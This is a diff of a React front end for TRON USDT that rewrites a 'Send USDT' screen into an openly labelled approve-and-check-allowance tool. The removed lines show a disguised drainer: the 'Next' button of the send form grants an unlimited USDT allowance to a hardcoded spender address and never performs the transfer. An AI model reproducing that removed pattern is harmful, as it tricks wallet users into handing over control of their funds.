@@ -1,44 +1,62 @@
 import React, { useState, useEffect } from "react";
 import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from "react-icons/fa";
-import TronWeb from "tronweb";
 import "./styles.css";
 
-const USDTSendApp = () => {
-  const [address, setAddress] = useState("");
-  const [amount, setAmount] = useState("");
-  const [memo, setMemo] = useState("");
-  const [account, setAccount] = useState("");
-  const [message, setMessage] = useState("");
+// ✅ TRC20 USDT contract on TRON mainnet
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+// ✅ Minimal ABI for TRC20 approve + allowance
+const USDT_ABI = [
+  {
+    constant: true,
+    inputs: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+    ],
+    name: "allowance",
+    outputs: [{ name: "remaining", type: "uint256" }],
+    payable: false,
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "spender", type: "address" },
+      { name: "value", type: "uint256" },
+    ],
+    name: "approve",
+    outputs: [{ name: "", type: "bool" }],
+    payable: false,
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
+
+const USDTAllowanceApp = () => {
   const [tronWeb, setTronWeb] = useState(null);
+  const [account, setAccount] = useState("");
+  const [spender, setSpender] = useState("");
+  const [amount, setAmount] = useState("");
+  const [allowance, setAllowance] = useState("");
+  const [message, setMessage] = useState("");
 
-  // ✅ USDT TRC20 contract on TRON mainnet
-  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-  const USDT_ABI = [
-    {
-      constant: false,
-      inputs: [
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-      ],
-      name: "approve",
-      outputs: [{ name: "", type: "bool" }],
-      payable: false,
-      stateMutability: "nonpayable",
-      type: "function",
-    },
-  ];
-
+  // ✅ Detect TronWeb (Trust Wallet / TronLink)
   useEffect(() => {
-    if (window.tronWeb && window.tronWeb.ready) {
-      setTronWeb(window.tronWeb);
-      setAccount(window.tronWeb.defaultAddress.base58);
-      setMessage("✅ Connected to TronLink");
-    } else {
-      setMessage("⚠️ Please install TronLink or open in Trust Wallet dApp browser");
-    }
+    const checkTron = () => {
+      if (window.tronWeb && window.tronWeb.ready) {
+        setTronWeb(window.tronWeb);
+        setAccount(window.tronWeb.defaultAddress.base58);
+        setMessage("✅ Connected: " + window.tronWeb.defaultAddress.base58);
+      } else {
+        setMessage("⚠️ Open in Trust Wallet or TronLink DApp browser");
+        setTimeout(checkTron, 1000);
+      }
+    };
+    checkTron();
   }, []);
 
+  // ✅ Connect wallet manually (for Trust Wallet DApp browser)
   const connectWallet = async () => {
     try {
       if (window.tronLink) {
@@ -54,23 +72,15 @@ const USDTSendApp = () => {
     }
   };
 
-  const handleNext = async () => {
-    if (!tronWeb || !account) {
-      setMessage("Please connect your wallet first");
-      return;
-    }
-    if (!address || !amount) {
-      setMessage("Please enter both address and amount");
-      return;
-    }
-    try {
-      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender
-      const unlimitedAmount =
-        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // MaxUint256
+  // ✅ Approve spender for amount
+  const handleApprove = async () => {
+    if (!tronWeb || !account) return setMessage("Please connect your wallet first");
+    if (!spender || !amount) return setMessage("Enter spender and amount");
 
+    try {
       const contract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-      const tx = await contract.approve(spender, unlimitedAmount).send({
-        feeLimit: 100_000_000, // 100 TRX energy/gas limit
+      const tx = await contract.approve(spender, tronWeb.toSun(amount)).send({
+        feeLimit: 100_000_000,
       });
 
       setMessage(`✅ Approval submitted! TxID: ${tx}`);
@@ -79,14 +89,30 @@ const USDTSendApp = () => {
     }
   };
 
+  // ✅ Check allowance
+  const handleCheckAllowance = async () => {
+    if (!tronWeb || !account) return setMessage("Please connect your wallet first");
+    if (!spender) return setMessage("Enter spender address");
+
+    try {
+      const contract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+      const result = await contract.allowance(account, spender).call();
+      const formatted = tronWeb.fromSun(result.remaining.toString());
+      setAllowance(formatted);
+      setMessage(`✅ Allowance: ${formatted} USDT`);
+    } catch (err) {
+      setMessage("❌ Failed to fetch allowance: " + (err?.message || err));
+    }
+  };
+
   return (
     <div className="send-usdt-container">
       <div className="send-usdt-card">
         <div className="send-header">
           <button className="back-button">←</button>
-          <h1 className="send-title">Send USDT (TRON)</h1>
+          <h1 className="send-title">USDT Allowance (TRON)</h1>
           {!account ? (
-            <button onClick={connectWallet}>Connect TronLink</button>
+            <button onClick={connectWallet}>Connect Wallet</button>
           ) : (
             <p>Connected: {account.slice(0, 6)}...{account.slice(-4)}</p>
           )}
@@ -94,30 +120,31 @@ const USDTSendApp = () => {
 
         {message && <div className="message-display">{message}</div>}
 
-        {/* Address */}
+        {/* Spender */}
         <div className="input-section">
-          <label className="input-label">Recipient Address</label>
-          <input value={address} onChange={(e) => setAddress(e.target.value)} />
+          <label className="input-label">Spender Address</label>
+          <input value={spender} onChange={(e) => setSpender(e.target.value)} />
         </div>
 
         {/* Amount */}
         <div className="input-section">
-          <label className="input-label">Amount</label>
+          <label className="input-label">Amount (USDT)</label>
           <input value={amount} onChange={(e) => setAmount(e.target.value)} />
         </div>
 
-        {/* Memo */}
-        <div className="input-section">
-          <label className="input-label">Memo</label>
-          <input value={memo} onChange={(e) => setMemo(e.target.value)} />
+        <div className="button-row">
+          <button className="next-button" onClick={handleApprove}>Approve</button>
+          <button className="next-button" onClick={handleCheckAllowance}>Check Allowance</button>
         </div>
 
-        <button className="next-button" onClick={handleNext} disabled={!address || !amount}>
-          Next
-        </button>
+        {allowance && (
+          <p className="allowance-display">
+            Current Allowance: {allowance} USDT
+          </p>
+        )}
       </div>
     </div>
   );
 };
 
-export default USDTSendApp;
+export default USDTAllowanceApp;
